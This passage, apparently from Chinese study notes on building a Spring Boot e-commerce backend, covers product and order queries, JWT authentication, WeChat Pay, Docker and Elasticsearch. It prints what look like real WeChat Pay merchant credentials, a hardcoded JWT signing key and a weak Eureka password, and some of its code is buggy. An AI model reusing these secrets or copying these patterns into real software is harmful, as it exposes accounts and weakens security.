id=&quot;selectBrandByCategoryId&quot; resultSets=&quot;java.util.List&quot; resultType=&quot;String&quot;&gt; select DISTINCT brand from product_params where product_id in ( select product_id from product where category_id=#&#123;cid&#125; ) &lt;/select&gt; service @Override public ResultVO listBrands(int categoryId) &#123; List&lt;String&gt; brands = productMapper.selectBrandByCategoryId(categoryId); return new ResultVO(ResStatus.OK,&quot;success&quot;,brands); &#125; controller @GetMapping(&quot;/listbrands/&#123;cid&#125;&quot;) public ResultVO getListBrands(@PathVariable(&quot;cid&quot;) String cid)&#123; return productService.listBrands(Integer.parseInt(cid)); &#125; 根据分类和品牌分页查询商品 请求url 响应结果 product/listbycid/49?pageNum=1&amp;limit=4 sql 由响应数据可以看出是分页查询，并且将商品的价格最低的sku一起返回 select * from product_sku where prodoct_id &#x3D; 1 ORDER BY sell_price limit 0,1 select * from product where category_id &#x3D; 49 dao * 根据三级分类ID分页查询商品信息 * @param cid 三级分类id * @param start 起始索引 * @param limit 查询记录数 * @return */ public List&lt;ProductVO&gt; selectProductByCategoryId(@Param(&quot;cid&quot;) int cid, @Param(&quot;start&quot;) int start, @Param(&quot;limit&quot;) int limit); &lt;resultMap id=&quot;ProductVOMap2&quot; type=&quot;com.qfedu.fmmall.entity.ProductVO&quot;&gt; &lt;id column=&quot;product_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productId&quot; /&gt; &lt;result column=&quot;product_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productName&quot; /&gt; &lt;result column=&quot;category_id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;categoryId&quot; /&gt; &lt;result column=&quot;root_category_id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;rootCategoryId&quot; /&gt; &lt;result column=&quot;sold_num&quot; jdbcType=&quot;INTEGER&quot; property=&quot;soldNum&quot; /&gt; &lt;result column=&quot;product_status&quot; jdbcType=&quot;INTEGER&quot; property=&quot;productStatus&quot; /&gt; &lt;result column=&quot;create_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;createTime&quot; /&gt; &lt;result column=&quot;update_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;updateTime&quot; /&gt; &lt;result column=&quot;content&quot; jdbcType=&quot;LONGVARCHAR&quot; property=&quot;content&quot; /&gt; &lt;!-- 根据商品ID查询价格最低的套餐 --&gt; &lt;collection property=&quot;skus&quot; column=&quot;product_id&quot; select=&quot;com.qfedu.fmmall.dao.ProductSkuMapper.selectLowerestPriceByProductId&quot;/&gt; &lt;/resultMap&gt; &lt;select id=&quot;selectProductByCategoryId&quot; resultMap=&quot;ProductVOMap2&quot;&gt; select product_id, product_name, category_id, root_category_id, sold_num, product_status, content, create_time, update_time from product where category_id=#&#123;cid&#125; limit #&#123;start&#125;,#&#123;limit&#125; &lt;/select&gt; selectLowerestPriceByProductId &lt;resultMap id=&quot;BaseResultMap&quot; type=&quot;com.qfedu.fmmall.entity.ProductSku&quot;&gt; &lt;id column=&quot;sku_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuId&quot; /&gt; &lt;result column=&quot;product_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productId&quot; /&gt; &lt;result column=&quot;sku_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuName&quot; /&gt; &lt;result column=&quot;sku_img&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuImg&quot; /&gt; &lt;result column=&quot;untitled&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;untitled&quot; /&gt; &lt;result column=&quot;original_price&quot; jdbcType=&quot;INTEGER&quot; property=&quot;originalPrice&quot; /&gt; &lt;result column=&quot;sell_price&quot; jdbcType=&quot;INTEGER&quot; property=&quot;sellPrice&quot; /&gt; &lt;result column=&quot;discounts&quot; jdbcType=&quot;DECIMAL&quot; property=&quot;discounts&quot; /&gt; &lt;result column=&quot;stock&quot; jdbcType=&quot;INTEGER&quot; property=&quot;stock&quot; /&gt; &lt;result column=&quot;create_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;createTime&quot; /&gt; &lt;result column=&quot;update_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;updateTime&quot; /&gt; &lt;result column=&quot;status&quot; jdbcType=&quot;INTEGER&quot; property=&quot;status&quot; /&gt; &lt;/resultMap&gt; &lt;select id=&quot;selectLowerestPriceByProductId&quot; resultMap=&quot;BaseResultMap&quot;&gt; select sku_id,product_id,sku_name, sku_img,untitled,original_price,sell_price, discounts,stock,create_time,update_time,status from product_sku where product_id = #&#123;productId&#125; ORDER BY sell_price limit 0,1 &lt;/select&gt; service @Override public ResultVO getProductsByCategoryId(int categoryId, int pageNum, int limit) &#123; //1.查询分页数据 int start = (pageNum-1)*limit; List&lt;ProductVO&gt; productVOS = productMapper.selectProductByCategoryId(categoryId, start, limit); //2.查询当前类别下的商品的总记录数 Example example = new Example(Product.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(&quot;categoryId&quot;,categoryId); int count = productMapper.selectCountByExample(example); //3.计算总页数 int pageCount = count%limit==0? count/limit : count/limit+1; //4.封装返回数据 PageHelper&lt;ProductVO&gt; pageHelper = new PageHelper&lt;&gt;(count, pageCount, productVOS); return new ResultVO(ResStatus.OK,&quot;SUCCESS&quot;,pageHelper); &#125; controller @ApiOperation(&quot;商品品牌分页查询接口&quot;) @GetMapping(&quot;/listbycid/&#123;cid&#125;&quot;) public ResultVO getProductsByCategoryId(@PathVariable(&quot;cid&quot;) String cid, @RequestParam(&quot;pageNum&quot;) int pageNum, @RequestParam(&quot;limit&quot;) int limit)&#123; return productService.getProductsByCategoryId(Integer.parseInt(cid), pageNum, limit); &#125; 1.13 关键字搜索商品 搜索相关商品的品牌 dao &lt;select id=&quot;selectBrandByKeyword&quot; resultSets=&quot;java.util.List&quot; resultType=&quot;String&quot;&gt; select DISTINCT brand from product_params where product_id in ( select product_id from product where product_name like #&#123;kw&#125; ) &lt;/select&gt; service @Override public ResultVO listBrands(String kw) &#123; kw = &quot;%&quot;+kw+&quot;%&quot;; List&lt;String&gt; brands = productMapper.selectBrandByKeyword(kw); return new ResultVO(ResStatus.OK,&quot;SUCCESS&quot;,brands); &#125; 搜索出包含关键词的商品 dao &lt;select id=&quot;selectProductByKeyword&quot; resultMap=&quot;ProductVOMap2&quot;&gt; select product_id, product_name, category_id, root_category_id, sold_num, product_status, content, create_time, update_time from product where product_name like #&#123;kw&#125; limit #&#123;start&#125;,#&#123;limit&#125; &lt;/select&gt; service @Override public ResultVO searchProduct(String kw, int pageNum, int limit) &#123; //1.查询搜索结果 kw = &quot;%&quot;+kw+&quot;%&quot;; int start = (pageNum-1)*limit; List&lt;ProductVO&gt; productVOS = productMapper.selectProductByKeyword(kw, start, limit); //2.查询总记录数 Example example = new Example(Product.class); Example.Criteria criteria = example.createCriteria(); criteria.andLike(&quot;productName&quot;,kw); int count = productMapper.selectCountByExample(example); //3.计算总页数 int pageCount = count%limit==0? count/limit:count/limit+1; //4.封装，返回数据 PageHelper&lt;ProductVO&gt; pageHelper = new PageHelper&lt;&gt;(count, pageCount, productVOS); ResultVO resultVO = new ResultVO(ResStatus.OK, &quot;SUCCESS&quot;, pageHelper); return resultVO; &#125; 1.14 个人中心显示所有订单 order/list?userId=15&amp;pageNum=1&amp;limit=5&amp;status=1 dao OrdersMapper public List&lt;OrdersVO&gt; selectOrders(@Param(&quot;userId&quot;) String userId, @Param(&quot;status&quot;) String status, @Param(&quot;start&quot;) int start, @Param(&quot;limit&quot;) int limit); &lt;resultMap id=&quot;OrdersVOMap&quot; type=&quot;com.qfedu.fmmall.entity.OrdersVO&quot;&gt; &lt;id column=&quot;order_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;orderId&quot; /&gt; &lt;result column=&quot;user_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;userId&quot; /&gt; &lt;result column=&quot;untitled&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;untitled&quot; /&gt; &lt;result column=&quot;receiver_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;receiverName&quot; /&gt; &lt;result column=&quot;receiver_mobile&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;receiverMobile&quot; /&gt; &lt;result column=&quot;receiver_address&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;receiverAddress&quot; /&gt; &lt;result column=&quot;total_amount&quot; jdbcType=&quot;DECIMAL&quot; property=&quot;totalAmount&quot; /&gt; &lt;result column=&quot;actual_amount&quot; jdbcType=&quot;INTEGER&quot; property=&quot;actualAmount&quot; /&gt; &lt;result column=&quot;pay_type&quot; jdbcType=&quot;INTEGER&quot; property=&quot;payType&quot; /&gt; &lt;result column=&quot;order_remark&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;orderRemark&quot; /&gt; &lt;result column=&quot;status&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;status&quot; /&gt; &lt;result column=&quot;delivery_type&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;deliveryType&quot; /&gt; &lt;result column=&quot;delivery_flow_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;deliveryFlowId&quot; /&gt; &lt;result column=&quot;order_freight&quot; jdbcType=&quot;DECIMAL&quot; property=&quot;orderFreight&quot; /&gt; &lt;result column=&quot;delete_status&quot; jdbcType=&quot;INTEGER&quot; property=&quot;deleteStatus&quot; /&gt; &lt;result column=&quot;create_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;createTime&quot; /&gt; &lt;result column=&quot;update_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;updateTime&quot; /&gt; &lt;result column=&quot;pay_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;payTime&quot; /&gt; &lt;result column=&quot;delivery_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;deliveryTime&quot; /&gt; &lt;result column=&quot;flish_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;flishTime&quot; /&gt; &lt;result column=&quot;cancel_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;cancelTime&quot; /&gt; &lt;result column=&quot;close_type&quot; jdbcType=&quot;INTEGER&quot; property=&quot;closeType&quot; /&gt; &lt;collection property=&quot;orderItems&quot; column=&quot;order_id&quot; select=&quot;com.qfedu.fmmall.dao.OrderItemMapper.listOrderItemsByOrderId&quot;/&gt; &lt;/resultMap&gt; &lt;select id=&quot;selectOrders&quot; resultMap=&quot;OrdersVOMap&quot;&gt; select order_id,user_id,untitled,receiver_name, receiver_mobile,receiver_address, total_amount, actual_amount,pay_type,order_remark,status,delivery_type, delivery_flow_id,order_freight,delete_status,create_time, update_time,pay_time,delivery_time, flish_time,cancel_time,close_type from orders where user_id=#&#123;userId&#125; &lt;if test=&quot;status != null&quot;&gt; and status=#&#123;status&#125; &lt;/if&gt; limit #&#123;start&#125;,#&#123;limit&#125; &lt;/select&gt; OrderItemMapper public List&lt;OrderItem&gt; listOrderItemsByOrderId(String orderId); &lt;resultMap id=&quot;BaseResultMap&quot; type=&quot;com.qfedu.fmmall.entity.OrderItem&quot;&gt; &lt;id column=&quot;item_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;itemId&quot; /&gt; &lt;result column=&quot;order_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;orderId&quot; /&gt; &lt;result column=&quot;product_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productId&quot; /&gt; &lt;result column=&quot;product_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productName&quot; /&gt; &lt;result column=&quot;product_img&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productImg&quot; /&gt; &lt;result column=&quot;sku_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuId&quot; /&gt; &lt;result column=&quot;sku_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuName&quot; /&gt; &lt;result column=&quot;product_price&quot; jdbcType=&quot;DECIMAL&quot; property=&quot;productPrice&quot; /&gt; &lt;result column=&quot;buy_counts&quot; jdbcType=&quot;INTEGER&quot; property=&quot;buyCounts&quot; /&gt; &lt;result column=&quot;total_amount&quot; jdbcType=&quot;DECIMAL&quot; property=&quot;totalAmount&quot; /&gt; &lt;result column=&quot;basket_date&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;basketDate&quot; /&gt; &lt;result column=&quot;buy_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;buyTime&quot; /&gt; &lt;result column=&quot;is_comment&quot; jdbcType=&quot;INTEGER&quot; property=&quot;isComment&quot; /&gt; &lt;/resultMap&gt; &lt;select id=&quot;listOrderItemsByOrderId&quot; resultMap=&quot;BaseResultMap&quot;&gt; select item_id, order_id, product_id, product_name, product_img, sku_id, sku_name, product_price, buy_counts, total_amount, basket_date, buy_time, is_comment from order_item where order_id=#&#123;orderId&#125; &lt;/select&gt; service @Override public ResultVO listOrders(String userId, String status, int pageNum, int limit) &#123; Example example = new Example(Orders.class); Example.Criteria criteria = example.createCriteria(); criteria.andLike(&quot;userId&quot;, userId); if(status != null &amp;&amp; &quot;&quot;.equals(status))&#123; criteria.andEqualTo(&quot;status&quot;,status); &#125; int count = ordersMapper.selectCountByExample(example); //2.计算总页数（必须确定每页显示多少条 pageSize = limit） int pageCount = count%limit==0? count/limit : count/limit+1; int start = (pageNum-1)*limit; List&lt;OrdersVO&gt; ordersVOS = ordersMapper.selectOrders(userId, status, start, limit); PageHelper&lt;OrdersVO&gt; ordersVOPageHelper = new PageHelper&lt;&gt;(count, pageCount, ordersVOS); return ResultVO.success(ordersVOPageHelper); &#125; controller @GetMapping(&quot;/list&quot;) public ResultVO getList(String userId, String status, int pageNum, int limit)&#123; return orderService.listOrders(userId, status, pageNum,limit); &#125; 收货地址管理2 JWT实现权限认证2.1 JWT实现导入JWT依赖&lt;dependency&gt; &lt;groupId&gt;com.auth0&lt;/groupId&gt; &lt;artifactId&gt;java-jwt&lt;/artifactId&gt; &lt;version&gt;3.10.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt; &lt;artifactId&gt;jjwt&lt;/artifactId&gt; &lt;version&gt;0.9.1&lt;/version&gt; &lt;/dependency&gt; 生成对应的token并返回给前端// 验证成功则生成对应的token // 使用jwt生成token JwtBuilder builder = Jwts.builder(); Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;key1&quot;, &quot;value2&quot;); map.put(&quot;key2&quot;, &quot;value2&quot;); JwtBuilder jwtBuilder = builder.setSubject(username) //设置subject .setIssuedAt(new Date()) // 设置token生成的时间 .setId(user.getUserId() + &quot;&quot;) // 设置userid为token的唯一id .setClaims(map) // map中可以存放用户的角色和权限信息 .setExpiration(new Date(System.currentTimeMillis() + 24 * 60 * 60 * 1000 * 2)) // 设置token的过期时间 为两天 .signWith(SignatureAlgorithm.HS256, &quot;sunzy123456&quot;);// 设置token的加密方式和加密密钥 String token = jwtBuilder.compact(); // 获取token return new ResultVO(ResStatus.OK, token, user); 前端进行登录验证时获取对应的token JWT进行token解析if(token == null || &quot;&quot;.equals(token))&#123; return new ResultVO(ResStatus.NO, &quot;failed&quot;, null); &#125;else &#123; JwtParser parser = Jwts.parser(); parser.setSigningKey(&quot;sunzy123456&quot;); // 密钥需要与加密时使用的一致 try&#123; // 如果token正确 且在有效期内 则解析正常否则会出现异常 Jws&lt;Claims&gt; claimsJws = parser.parseClaimsJws(token); Claims body = claimsJws.getBody(); // 获取token中的用户数据 String subject = body.getSubject(); // 获取token中发subject String key1 = body.get(&quot;key1&quot;, String.class); /// 获取添加在map中的值 &#125;catch(UnsupportedJwtException e)&#123; return new ResultVO(ResStatus.NO, &quot;token不合法请重新登录！&quot;, null); &#125;catch(ExpiredJwtException e)&#123; return new ResultVO(ResStatus.NO, &quot;token已过期，请重新登录！&quot;, null); &#125; catch (Exception e)&#123; return new ResultVO(ResStatus.NO, &quot;未知错误&quot;, null); &#125; 使用拦截器验证token 创建拦截器 package com.sunzy.fmmall.interceptor; import com.alibaba.fastjson.JSON; import com.sunzy.fmmall.vo.ResStatus; import com.sunzy.fmmall.vo.ResultVO; import io.jsonwebtoken.*; import org.springframework.context.annotation.Configuration; import org.springframework.stereotype.Component; import org.springframework.web.servlet.HandlerInterceptor; import org.springframework.web.servlet.ModelAndView; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.io.PrintWriter; @Component public class CheckTokenInterceptor implements HandlerInterceptor &#123; @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123; String token = request.getParameter(&quot;token&quot;); if (token == null || &quot;&quot;.equals(token)) &#123; doResponse(response, &quot;请先登录！&quot;); return false; &#125; else &#123; JwtParser parser = Jwts.parser(); parser.setSigningKey(&quot;sunzy123456&quot;); // 密钥需要与加密时使用的一致 try &#123; // 如果token正确 且在有效期内 则解析正常否则会出现异常 Jws&lt;Claims&gt; claimsJws = parser.parseClaimsJws(token); Claims body = claimsJws.getBody(); // 获取token中的用户数据 String subject = body.getSubject(); // 获取token中发subject String key1 = body.get(&quot;key1&quot;, String.class); /// 获取添加在map中的值 return true; &#125; catch (UnsupportedJwtException e) &#123; doResponse(response,&quot;token不合法，请重新登录！&quot;); &#125; catch (ExpiredJwtException e) &#123; doResponse(response,&quot;token已过期，请重新登录！&quot;); &#125; catch (Exception e) &#123; doResponse(response,&quot;未知错误！&quot;); &#125; return false; &#125; &#125; private void doResponse(HttpServletResponse response, String msg) throws IOException &#123; ResultVO resultVO = new ResultVO(ResStatus.NO, msg, null); String string = JSON.toJSONString(resultVO); response.setContentType(&quot;application/json&quot;); response.setCharacterEncoding(&quot;utf-8&quot;); PrintWriter writer = response.getWriter(); writer.write(string); writer.flush(); writer.close(); &#125; &#125; 配置拦截器 package com.sunzy.fmmall.config; import com.sunzy.fmmall.interceptor.CheckTokenInterceptor; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.context.annotation.Configuration; import org.springframework.web.servlet.config.annotation.InterceptorRegistry; import org.springframework.web.servlet.config.annotation.WebMvcConfigurer; /** * 拦截器的配置类 */ @Configuration public class InterceptorConfig implements WebMvcConfigurer &#123; @Autowired private CheckTokenInterceptor checkTokenInterceptor; @Override public void addInterceptors(InterceptorRegistry registry) &#123; // registry是拦截器的注册器 // 将自己创建的拦截器加入进来 即可实现拦截功能 registry.addInterceptor(checkTokenInterceptor) .addPathPatterns(&quot;/**&quot;) // 拦截所有路径 .excludePathPatterns(&quot;/user/**&quot;); // 除了用户登录和注册路径 &#125; &#125; 2.2 通过header传递token 前端访问受限资源时，都必须携带token发送请求，token可以放在请求行(params)、请求头(header)以及请求体(data)，但是一般默认放在请求头中 前端使用axios axios(&#123; url:url, method:&quot;get&quot;, headers:&#123; token:token &#125;, params:&#123; userId:userId &#125; &#125;) 浏览器的预检机制 只要是带自定义header的跨域请求，在发送真实请求前都会先发送OPTIONS请求，浏览器根据OPTIONS请求返回的结果来决定是否继续发送真实的请求进行跨域资源访问。所以复杂请求肯定会两次请求服务端。 因此需要在拦截器中加入以下代码，必要响应第一次的OPTIONS请求后，才能收到第二次的GET请求。 String method = request.getMethod(); System.out.println(method); if(&quot;OPTIONS&quot;.equals(method))&#123; return true; &#125; 3.通用实体类3.1 用于响应的实体类 package com.qfedu.fmmall.vo; import io.swagger.annotations.ApiModel; import io.swagger.annotations.ApiModelProperty; import lombok.AllArgsConstructor; import lombok.Data; import lombok.NoArgsConstructor; import javax.annotation.Resource; @Data @NoArgsConstructor @AllArgsConstructor @ApiModel(value = &quot;ResultVO对象&quot;,description = &quot;封装接口返回给前端的数据&quot;) public class ResultVO &#123; //响应给前端的状态码 @ApiModelProperty(value = &quot;响应状态码&quot;,dataType = &quot;int&quot;) private int code; //响应给前端的提示信息 @ApiModelProperty(&quot;响应提示信息&quot;) private String msg; //响应给前端的数据 @ApiModelProperty(&quot;响应数据&quot;) private Object data; public static ResultVO success()&#123; return new ResultVO(ResStatus.OK, &quot;success&quot;, null); &#125; public static ResultVO success(String msg)&#123; return new ResultVO(ResStatus.OK, msg, null); &#125; public static ResultVO success(Object obj)&#123; return new ResultVO(ResStatus.OK, &quot;success&quot;, obj); &#125; public static ResultVO failed()&#123; return new ResultVO(ResStatus.NO, &quot;failed&quot;, null); &#125; public static ResultVO failed(String msg)&#123; return new ResultVO(ResStatus.NO, msg, null); &#125; &#125; 4 微信支付 通过微信平台为商家提供代收款服务 4.1 商户注册微信支付业务 商户编号：1497984412 商户账号AppID：wx632c8f211f8122c6 商户Key：sbNCm1JnevqI36LrEaxFwcaT0hkGxFnC 4.2 商户向微信申请支付订单，即支付短链接 导入微信支付的依赖 &lt;dependency&gt; &lt;groupId&gt;com.github.wxpay&lt;/groupId&gt; &lt;artifactId&gt;wxpay-sdk&lt;/artifactId&gt; &lt;version&gt;0.0.3&lt;/version&gt; &lt;/dependency&gt; 创建WXPayConfig，重写里面的方法，设置自己的AppID，商户id，密钥， public class MyPayConfig implements WXPayConfig &#123; @Override public String getAppID() &#123; return &quot;wx632c8f211f8122c6&quot;; &#125; @Override public String getMchID() &#123; return &quot;1497984412&quot;; &#125; @Override public String getKey() &#123; return &quot;sbNCm1JnevqI36LrEaxFwcaT0hkGxFnC&quot;; &#125; @Override public InputStream getCertStream() &#123; return null; &#125; @Override public int getHttpConnectTimeoutMs() &#123; return 0; &#125; @Override public int getHttpReadTimeoutMs() &#123; return 0; &#125; &#125; 设置⽀付订单的参数 HashMap&lt;String,String&gt; data = new HashMap&lt;&gt;(); data.put(&quot;body&quot;,&quot;咪咪萧条&quot;); //商品描述 data.put(&quot;out_trade_no&quot;,orderId); //使⽤当前⽤户订单的编号作为当前⽀付交易的 交易号 data.put(&quot;fee_type&quot;,&quot;CNY&quot;); //⽀付币种 data.put(&quot;total_fee&quot;,&quot;1&quot;); //⽀付⾦额 data.put(&quot;trade_type&quot;,&quot;NATIVE&quot;); //交易类型 data.put(&quot;notify_url&quot;,&quot;/pay/success&quot;); //设置⽀付完成时的回调⽅法 接⼝ 申请支付连接 WXPay wxPay = new WXPay(new MyPayConfig()); Map&lt;String, String&gt; resp = wxPay.unifiedOrder(data); //发送请求 orderInfo.put(&quot;payUrl&quot;,resp.get(&quot;code_url&quot;)); 5 Ngrok实现内网穿透 注册Ngrok后进行实名认证 开通隧道 获取隧道ID 下载ngork客户端 启动客户端，输入对应的隧道ID，即可实现内网穿透 6 quartz定时任务框架使⽤6.1 导入依赖&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-quartz&lt;/artifactId&gt; &lt;/dependency&gt; 6.2 创建定时任务@Component public class PrintHelloWorldJob &#123; //https://cron.qqe2.com @Scheduled(cron = &quot;0/3 * * * * ?&quot;) public void printHelloWorld()&#123; System.out.println(&quot;----hello world.&quot;); &#125; &#125; 6.3 在启动类添加注解以开启定时任务@SpringBootApplication @EnableScheduling public class QuartzDemoApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(QuartzDemoApplication.class, args); &#125; &#125; 当控制台打印出这段日志时，说明定时任务创建成功 7 后端项目部署使用docker部署项目 Dockerfile FROM java:8-alpine COPY ./app.jar /tmp/app.jar EXPOSE 8080 ENTRYPOINT java -jar /tmp/app.jar 项目打包 将jar包放到与dockerfile同一目录下 上传到服务器中构建镜像 进入到Dockerfile所在的目录下，运行以下命令 docker build -t fmmall . 创建容器 docker run --name fmmall -p 8080:8080 -d fmmall 分布式使用watch dog机制监视redis中key的过期时间 看门狗线程：用于给当前的key延长过期时间，保证业务线程正常执行过程，锁不会过期 分布式锁框架-redisson 基于redis+看门狗实现的分布式锁框架 ESspringboot整合ES 导入依赖 &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-elasticsearch&lt;/artifactId&gt; &lt;/dependency&gt; 配置信息 spring: elasticsearch: rest: uris: http://192.168.238.132:9200 将数据库中的信息导入到ES中 如果商品表中没有数据，则在平台管理系统中的商品添加功能中，当商家向商品表添加并上架一个商品时同步向ES添加一个商品;商家下架一个商品就从ES中删除一个商品。系统运行前期数据量小没有使用ES，当数据量增长之后使用ES时，需要将数据库现有的数据导入到ES(导入工作需要在项目部署到生产环境之前来完成) // 1.查询数据库获取到所有数据 List&lt;ProductVO&gt; productVOS = productMapper.selectProducts(); int size = productVOS.size(); // return ResultVO.success(size); // 2. 遍历数据将数据写入到ES中 this.client =new RestHighLevelClient(RestClient.builder( HttpHost.create(&quot;http://192.168.238.132:9200&quot;) )); for (int i = 0; i &lt; productVOS.size(); i++) &#123; ProductVO productVO = productVOS.get(i); String productId = productVO.getProductId(); String productName = productVO.getProductName(); Integer soldNum = productVO.getSoldNum(); List&lt;ProductSku&gt; skus = productVO.getSkus(); String skuImg = skus.size() == 0? &quot;&quot;: productVO.getSkus().get(0).getSkuImg(); String skuName = skus.size() == 0? &quot;&quot;: productVO.getSkus().get(0).getSkuName(); Integer sellPrice = skus.size() == 0? 0: productVO.getSkus().get(0).getSellPrice(); Product4ES product4ES = new Product4ES(productId, productName, skuImg, soldNum, skuName, sellPrice); IndexRequest request = new IndexRequest(&quot;fmmallproductindex&quot;); request.id(productId).source(JSON.toJSONString(product4ES), XContentType.JSON); IndexResponse index = this.client.index(request, RequestOptions.DEFAULT); System.out.println(&quot;------ i &quot; + i + &quot;-----&quot; + index); &#125; this.client.close(); 使用ES进行进行全文搜索 /*从ES中查询信息*/ this.client =new RestHighLevelClient(RestClient.builder( HttpHost.create(&quot;http://192.168.238.132:9200&quot;) )); int start = (pageNum-1)*limit; SearchRequest request = new SearchRequest(&quot;fmmallproductindex&quot;); SearchSourceBuilder sourceBuilder = new SearchSourceBuilder(); sourceBuilder.query(QueryBuilders.multiMatchQuery(kw, &quot;productName&quot;, &quot;pruductSkuName&quot;)); // 分页条件 sourceBuilder.from(start); sourceBuilder.size(limit); // 高亮显示 HighlightBuilder highlightBuilder = new HighlightBuilder(); HighlightBuilder.Field productName = new HighlightBuilder.Field(&quot;productName&quot;); HighlightBuilder.Field pruductSkuName = new HighlightBuilder.Field(&quot;pruductSkuName&quot;); highlightBuilder.field(productName); highlightBuilder.field(pruductSkuName); highlightBuilder.preTags(&quot;&lt;label style=&#x27;color:red&#x27;&gt;&quot;); highlightBuilder.postTags(&quot;&lt;label&gt;&quot;); sourceBuilder.highlighter(highlightBuilder); request.source(sourceBuilder); SearchResponse searchResponse = null; try &#123; searchResponse = this.client.search(request, RequestOptions.DEFAULT); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; // 处理响应结果 SearchHits hits = searchResponse.getHits(); TotalHits totalHits = hits.getTotalHits(); int count = (int) totalHits.value; // 查询到的记录总数 int pageCount = (count%limit==0? count/limit:count/limit+1); Iterator&lt;SearchHit&gt; iterator = hits.iterator(); List&lt;Product4ES&gt; product4ESList = new ArrayList&lt;&gt;(); while(iterator.hasNext())&#123; SearchHit nextHit = iterator.next(); String sourceAsString = nextHit.getSourceAsString(); Product4ES product4ES = JSON.parseObject(sourceAsString, Product4ES.class); // 获取高亮字段 Map&lt;String, HighlightField&gt; highlightFields = nextHit.getHighlightFields(); HighlightField highLightProductName = highlightFields.get(&quot;productName&quot;); if(highLightProductName != null)&#123; String string = Arrays.toString(highLightProductName.fragments()); product4ES.setProductName(string); &#125; product4ESList.add(product4ES); &#125; PageHelper&lt;Product4ES&gt; pageHelper = new PageHelper&lt;&gt;(count, pageCount, product4ESList); ResultVO resultVO = new ResultVO(ResStatus.OK, &quot;SUCCESS&quot;, pageHelper); return resultVO; 搭建服务发现和注册中心Eureka 添加关于erueka相关配置信息 eureka: client: service-url: defaultZone: http://127.0.0.1:8761/eureka register-with-eureka: false fetch-registry: false server: port: 8761 spring: application: name: eureka-server 在项目的启动类中添加注释@EnableEurekaServer package com.qfedu.eureka.server; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.cloud.netflix.eureka.server.EnableEurekaServer; @SpringBootApplication @EnableEurekaServer public class EurekaServerApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(EurekaServerApplication.class, args); &#125; &#125; 配置security信息 spring: application: name: eureka-server security: user: name: sunzy password: 111111 配置springsecuity ``` ### 拆分用户登录模块 - 首先创建新的模块 api-user-login - 导入依赖 ```xml &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; 配置application.yml server: port: 8001 eureka: client: service-url: defualtZone: http://sunzy:111111@127.0.0.1:8761/eureka spring: application: name: api-user-login 在启动类添加注解@EnableDiscoveryClient和@EnableFeignClients package com.qfedu.api; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.cloud.client.discovery.EnableDiscoveryClient; import org.springframework.cloud.openfeign.EnableFeignClients; @SpringBootApplication @EnableDiscoveryClient @EnableFeignClients public class ApiUserLoginApplication &#123; public static void 